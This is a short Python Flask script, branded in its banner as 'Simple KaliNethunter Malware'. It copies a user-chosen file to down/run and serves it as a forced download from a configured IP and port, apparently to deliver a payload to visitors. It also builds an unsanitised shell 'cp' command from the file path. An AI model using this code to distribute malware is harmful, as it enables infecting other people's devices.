from flask import *
import json, os

from mod.file_finder import file_browse
from mod.setups import setup


file_runner = file_browse()

config = json.loads(open("config.json", "r").read())
sets = setup()

if config["setup"] != True:
    sets.run()
    print("[*] Please re run the program :)")
    exit()

file_path = file_runner.start()
os.system("cp "+file_path+" down/run")
app = Flask(__name__)


print("""
\x1B[2J\x1B[1;1H


█▀▀▄  ▀  █▀▀ █▀▀█ █  █ ▀▀█▀▀ █▀▀ 
█  █ ▀█▀ ▀▀█ █  █ █  █   █   █▀▀ 
▀▀▀  ▀▀▀ ▀▀▀ █▀▀   ▀▀    ▀   ▀▀▀ """+config["server"]["version"]+"""
 [Simple KaliNethunter Malware]
      
""")


@app.route("/")
def index():
    return send_file("down/run", as_attachment=True)


app.run(port=config["server"]["port"], host=config["server"]["ip"])